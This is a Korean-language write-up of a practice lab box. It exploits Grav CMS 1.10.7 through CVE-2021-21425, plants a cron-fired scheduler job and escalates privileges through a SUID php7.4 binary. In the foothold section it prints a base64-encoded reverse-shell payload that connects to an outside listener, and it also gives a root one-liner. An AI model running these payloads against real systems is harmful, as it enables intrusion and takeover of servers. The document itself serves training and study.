> [!info] PG Practice — Pentester Foundations #5
> **타겟** 192.168.248.12 · **OS** Ubuntu 20.04 (`gravity`) · **난이도** Fundamental · **플래그 1개**
> **경로 요약** 80 Grav CMS → **CVE-2021-21425** 비인증 YAML 쓰기로 스케줄러에 잡 삽입 → 크론 발화 → `www-data` → **SUID `php7.4`** → root

### Nmap

```bash
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ sudo nmap -Pn -sS -sV -T4 -p- --min-rate 2000 192.168.248.12
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41
```

루트가 **디렉터리 리스팅**이고 항목이 `grav-admin/` 하나뿐이다. Grav CMS(PHP flat-file CMS) 확정.

### 정보 유출 두 갈래 — 버전 판정의 재료

**① Whoops 백트레이스가 비인증으로 통째로 노출된다**

URL에 `#`(=`%23`)를 넣으면 Grav가 파싱에 실패하며 500과 함께 **218KB짜리 Whoops 디버그 페이지**를 뱉는다:

```bash
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ curl -s -o w.html -w 'HTTP=%{http_code} SIZE=%{size_download}\n' 'http://192.168.248.12/grav-admin/%23.txt'
HTTP=500 SIZE=218880

┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ grep -oE 'Undefined index: path|/var/www/html/grav-admin/[^"]+\.php' w.html | sort -u | head
Undefined index: path
/var/www/html/grav-admin/system/src/Grav/Common/Grav.php
```

**웹루트 절대경로(`/var/www/html/grav-admin`)와 전체 스택 프레임**을 공짜로 얻는다. ([[RubyDome]]에서 500을 유발해 gem 버전을 뽑은 것과 같은 수법 — 이번엔 URL에 `#` 하나만 넣으면 된다)

**② `.htaccess` 확장자 목록에 `json`이 빠져 있다**

Grav의 `.htaccess`는 `system/`·`vendor/` 하위를 차단하는데, 규칙이 확장자 화이트리스트 방식이라 누락이 생긴다:

```apache
^(system|vendor)/(.*)\.(txt|xml|md|html|yaml|yml|php|pl|py|cgi|twig|sh|bat)$
```

`json`이 없다. 그래서 **같은 디렉터리에서 `.php`는 403인데 `.json`은 200**이다:

```bash
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ curl -s -o /dev/null -w 'installed.json HTTP=%{http_code} SIZE=%{size_download}\n' \
    http://192.168.248.12/grav-admin/vendor/composer/installed.json
installed.json HTTP=200 SIZE=126903
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ curl -s -o /dev/null -w 'installed.php HTTP=%{http_code}\n' \
    http://192.168.248.12/grav-admin/vendor/composer/installed.php
installed.php HTTP=403
```

`installed.json`에는 **51개 의존 패키지의 버전 + git commit reference**가 전부 들어 있다.

> [!tip] 차단 규칙은 "무엇을 막는가"보다 "무엇을 빠뜨렸는가"를 본다
> 확장자 화이트리스트/블랙리스트 방식의 접근 제어는 **누락이 생기기 마련**이다.
> 403이 나오면 포기하지 말고 **같은 파일의 다른 확장자, 같은 디렉터리의 다른 파일**을 찔러본다.
> `.json`·`.lock`·`.map`·`.bak`·`.dist`·`.orig`·`.swp`가 상습 누락 대상이다.

### 버전 판정 — 독립 근거 3개

| 근거 | 출처 | 결론 |
|---|---|---|
| **A. Whoops 스택 프레임의 라인 번호** | 런타임 (최상위) | `Grav.php:739` = `$media_file = $parsed_url['path'];` → 예외 `Undefined index: path`와 일치. **1.7.8 이상**, ≤1.7.7 배제 |
| **B. `installed.json` 51개 패키지 대조** | 패키지 메타데이터 | 1.7.8과 **51/51 완전 일치**. 1.7.9는 2건 불일치(`phpuseragentparser` v1.3.0 vs v1.4.0, `whoops` 2.9.2 vs 2.10.0) |
| **C. Apache autoindex 타임스탬프** | 서버 파일시스템 | `grav-admin/ 2021-03-17 17:46` ↔ Grav 1.7.8 태그 커밋 `2021-03-17T17:44:48Z` (1분 뒤 설치) |

→ **Grav 코어 1.7.8** 확정.

Admin 플러그인은 별도로 판정한다 — **취약점 관점에서 중요한 건 이쪽**이다. 정적 자산의 콘텐츠 해시를 업스트림 git blob과 대조([[Levram]] 기법):

| 파일 | 판정 |
|---|---|
| `themes/grav/js/admin.min.js` (515478 B) | 1.10.6·1.10.7에만 존재 → **≥1.10.8 배제** |
| `themes/grav/css-compiled/template.css` | blob `47fe3ffb…` = **1.10.7 정확 일치** (1.10.6은 `85ee7d63…`) |
| `admin/vendor/composer/installed.json` | blob `37706b14…` = **1.10.7 정확 일치** |

→ **Admin 플러그인 1.10.7** 확정.

> [!warning] GitHub Releases의 `published_at`에 속을 뻔했다
> Releases API는 admin 1.10.7을 **2021-03-19**로 표시해서 코어 1.7.8(03-17)보다 늦어 보인다. 그러면 "1.7.8에 1.10.7이 번들될 리 없다"는 잘못된 결론이 나온다.
> 소급 등록된 릴리스이고 **태그 커밋 날짜가 진짜다**:
> ```
> grav-plugin-admin 1.10.7  2021-03-17T17:43:19Z
> grav              1.7.8    2021-03-17T17:44:48Z   ← 89초 뒤
> ```
> **릴리스 페이지 날짜 ≠ 커밋 날짜.** 시간순으로 뭔가를 추론할 때는 커밋 날짜를 봐라.

CVE-2021-21425의 영향 범위는 exploit-db `49788.rb`(Metasploit 모듈) 본문에서 확인된다 — **1.10.7 포함(inclusive)**. 타겟이 정확히 1.10.7이므로 해당.

```bash
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ searchsploit grav cms
GravCMS 1.10.7 - Arbitrary YAML Write/Update ...      | php/webapps/49973.py
GravCMS 1.10.7 - Unauthenticated Arbitrary Fi ...     | php/webapps/49788.rb
Grav CMS 1.7.10 - Server-Side Template Injection      | php/webapps/49961.py
```

### 전제조건 확인 — nonce가 비인증으로 샌다

CVE-2021-21425를 태우려면 **admin nonce**가 필요한데, Grav 1.10.7의 로그인 페이지가 이걸 그냥 내준다:

```bash
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ curl -s http://192.168.248.12/grav-admin/admin | grep -oE 'admin-nonce" value="[a-f0-9]+"'
admin-nonce" value="0d218dcad1d32fb88e106abb9d5473e4"
```

> [!tip] CSRF 토큰이 로그인 전에 보이면 그 자체가 결함이다
> nonce/CSRF 토큰은 **인증된 세션에 묶여야** 의미가 있다. 로그인 폼에 박혀 있는 토큰이 관리자 기능에도 그대로 통한다면, 그 토큰은 방어가 아니라 **공격 재료**다.
> 익스플로잇을 실행하기 전에 이 한 줄로 **전제조건 충족 여부를 먼저 확인**하는 습관을 들일 것. 안 나오면 다른 경로를 찾아야 한다.

### Foothold — CVE-2021-21425 (비인증 임의 YAML 쓰기)

취약점은 `POST /grav-admin/admin/config/scheduler` 가 **인증 체크보다 먼저 YAML을 저장**한다는 것이다. `task=SaveDefault` + 노출된 nonce를 붙이면 `user/config/scheduler.yaml`에 임의 잡을 심을 수 있다.

심어지는 내용:

```yaml
command: /usr/bin/php
args: '-r eval(base64_decode("<payload>"));'
at: '* * * * *'
status: { ncefs: enabled }
```

페이로드(디코드 후):

```php
/*<?php /**/
file_put_contents('/tmp/rev.sh', base64_decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNy80NDQ0IDA+JjE='));
chmod('/tmp/rev.sh', 0755);
system('bash /tmp/rev.sh');
```

여기서도 **명령을 base64로 감싸는 기법**을 썼다 — YAML → PHP `-r` → 셸로 3중 인용을 통과해야 하기 때문이다. ([[RubyDome]]과 동일한 이유)

```bash
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ tmux new-session -d -s astro 'rlwrap nc -lvnp 4444'

┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ python3 grav_exp.py            # EDB 49973 기반, 타겟/LHOST만 수정
[+] nonce: 741f0720c9ae832283ee6c81d25a570a
[+] status: 200 len: 15592
<title>Grav Admin Login | Grav</title>
```

> [!danger] 응답이 **로그인 페이지(200)** 로 돌아온다 — 실패가 아니다
> "인증이 안 됐으니 실패했구나" 하고 접으면 박스를 놓친다.
> **YAML 쓰기는 인증 체크 앞에서 이미 일어났다.** Grav는 저장한 뒤에야 권한을 확인하고 로그인 페이지로 리다이렉트한다.
> 즉 **HTTP 응답은 공격 성공 여부를 알려주지 않는다.** 부작용(파일이 써졌는지, 잡이 도는지)으로 판단해야 한다.

> [!warning] 그리고 **약 60초를 기다려야 한다**
> 이 RCE는 즉시 발화하지 않는다. 시스템 crontab의
> ```
> * * * * * cd /var/www/html/grav-admin; /usr/bin/php bin/grav scheduler
> ```
> 이 1분마다 스케줄러를 돌릴 때 비로소 잡이 실행된다.
> **5초 보고 "안 되네" 하면 안 된다.** 크론 기반 RCE는 최소 1주기(여기선 60초)를 기다린다.

```bash
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.12] 43552
www-data@gravity:~/html/grav-admin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@gravity:~/html/grav-admin$ uname -a
Linux gravity 5.4.0-146-generic #163-Ubuntu SMP Fri Mar 17 18:26:02 UTC 2023 x86_64 GNU/Linux
```

> [!note] "응답이 성공을 뜻하지 않는다"의 세 가지 변형
> 지금까지 세 박스에서 각각 다른 형태로 나왔다. 전부 **리스너/부작용을 봐야** 판별된다.
> | 박스 | 겉보기 | 실제 |
> |---|---|---|
> | [[Crane]] | 스크립트가 멈춤 → 타임아웃 | 역직렬화가 인라인 발화, 셸은 이미 붙음 |
> | [[RubyDome]] | `HTTP=000` (curl exit 28) | 리버스셸이 요청을 물고 있음 |
> | **Astronaut** | **`200` + 로그인 페이지** | **쓰기는 인증 전에 완료, 60초 뒤 크론이 발화** |

### Privesc — SUID `php7.4`

```bash
www-data@gravity:~$ find / -perm -4000 -type f 2>/dev/null
/snap/core20/1852/usr/bin/{chfn,chsh,gpasswd,mount,newgrp,passwd,su,sudo,umount}
/snap/core20/1611/usr/bin/{chfn,chsh,gpasswd,mount,newgrp,passwd,su,sudo,umount}
/snap/snapd/18596/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/at
/usr/bin/su
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/php7.4          ← 비표준. 이것 하나만 보면 된다
/usr/bin/gpasswd
```

> [!tip] SUID 목록에서 노이즈를 걷어내는 법
> `/snap/core20/...` 두 벌은 **같은 스냅 리비전의 중복**이라 통째로 노이즈다. `chfn`·`chsh`·`gpasswd`·`mount`·`umount`·`newgrp`·`passwd`·`su`·`sudo`·`fusermount`·`ssh-keysign`·`polkit-agent-helper-1`·`dbus-daemon-launch-helper`는 **우분투 기본 SUID**다.
> 남는 것: **`/usr/bin/php7.4`** (인터프리터!) 와 `/usr/bin/at`.
> **인터프리터(php·python·perl·ruby)나 `find`·`vim`·`tar` 류가 SUID로 걸려 있으면 그 즉시 끝난다.** 기본 목록을 외워두면 3초 만에 골라낼 수 있다.

```bash
www-data@gravity:~$ ls -la /usr/bin/php7.4
-rwsr-xr-x 1 root root 4786104 Feb 23  2023 /usr/bin/php7.4

www-data@gravity:~$ /usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

> [!danger] `-p`가 없으면 실패한다
> `pcntl_exec('/bin/sh', ['-p'])` 의 `-p`는 **privileged 모드**다. 이게 없으면 `/bin/sh`(dash/bash)가 **"euid ≠ uid이면 특권을 드롭한다"**는 자체 보호 동작을 실행해서, 애써 얻은 euid 0이 즉시 날아간다.
> GTFOBins의 `-p`는 장식이 아니다. SUID 셸 계열(`bash -p`, `sh -p`)에서 전부 동일하다.

`euid=0`이면 `/root` 읽기에는 충분하다. (`uid`까지 0으로 만들려면 `posix_setuid(0)`를 먼저 호출한다)

### 플래그

```bash
# cat /root/proof.txt
df08cc108a6bd0c2739fa0e24fc52f89
# cat /root/flag1.txt
T2Zmc2Vj                      # base64 → "Offsec"  ← 미끼
# find / -name local.txt 2>/dev/null
       (없음)
```

| | |
|---|---|
| `proof.txt` | `df08cc108a6bd0c2739fa0e24fc52f89` |
| `local.txt` | **존재하지 않음** — 플래그 1개 박스 |
| `/root/flag1.txt` | `T2Zmc2Vj` = `Offsec` — **장식용 더미** |

`/home/alex/`는 dotfile만 있고 비어 있다. 포털 진행도 `0/1`이 이미 알려준 사실이다.

## OSCP 관점 정리

1. **403은 규칙의 누락을 찾으라는 신호다.** Grav `.htaccess`의 확장자 목록에 `json`이 빠져 있어서, 같은 디렉터리의 `.php`가 403인데 `installed.json`은 200으로 51개 패키지 버전을 통째로 내줬다. **`.json`·`.lock`·`.map`·`.bak`·`.dist`가 상습 누락 대상**이다.
2. **URL에 `#`(`%23`) 하나로 500을 유발**해 Whoops 백트레이스 218KB를 얻었다. 웹루트 절대경로와 스택 프레임이 전부 나온다. 에러 유발은 이제 열거 초반 루틴으로 굳혔다.
3. **릴리스 페이지 날짜 ≠ 커밋 날짜.** GitHub Releases의 `published_at`은 소급 등록될 수 있다. 버전을 시간순으로 추론할 때는 **태그 커밋 날짜**를 봐라.
4. **익스플로잇 전에 전제조건을 한 줄로 확인한다.** `curl ... | grep admin-nonce` 로 nonce 노출을 먼저 봤다. 안 나왔으면 이 경로는 버려야 한다. 익스플로잇을 던지고 나서 왜 안 되는지 고민하는 것보다 훨씬 싸다.
5. **HTTP 응답이 공격 성공을 뜻하지 않는다.** `200` + 로그인 페이지가 돌아왔지만 쓰기는 이미 끝나 있었다. 취약점이 **인증 체크보다 앞선 지점**에 있으면 응답은 정상 흐름을 그대로 보여준다. **부작용으로 판정하라.**
6. **크론 기반 RCE는 기다려야 한다.** 최소 1주기(여기선 60초). 즉시 반응이 없다고 실패로 결론내면 안 된다. 반대로 말하면, **셸이 늦게 붙는 박스는 크론을 의심**한다.
7. **SUID 목록은 기본값을 걷어내고 봐야 한다.** `/snap/core20/*` 중복과 우분투 기본 SUID 14종을 지우면 `php7.4` 하나가 남는다. **인터프리터가 SUID면 그 즉시 root다.**
8. **GTFOBins의 `-p`를 빠뜨리지 마라.** 셸은 euid ≠ uid일 때 스스로 특권을 드롭한다. `sh -p` / `bash -p`가 이걸 막는다.
9. **더미 플래그에 속지 마라.** `/root/flag1.txt`의 `T2Zmc2Vj`는 디코드하면 그냥 `Offsec`이다. 32자 hex가 아니면 플래그가 아니다.

## 남긴 흔적 (랩 정리용)

익스플로잇이 `user/config/scheduler.yaml`에 **1분마다 리버스셸을 재발사하는 잡**을 심었다. 셸 확보 후 원본 백업(`scheduler.yaml.bak-exploit`)을 남기고 잡을 비활성화(`custom_jobs: {}` / `status: {}`)했다.
시스템 crontab은 박스 원래 구성이라 건드리지 않았다. 타겟에 `/tmp/rev.sh`가 남아 있다. 랩 Stop/Revert 시 전부 소멸.

## 관련 노트

- [[01. Pentest Foundations]] — Astronaut 항목
- [[Crane]] · [[Hub]] · [[Levram]] · [[RubyDome]] — 같은 컬렉션 앞 박스
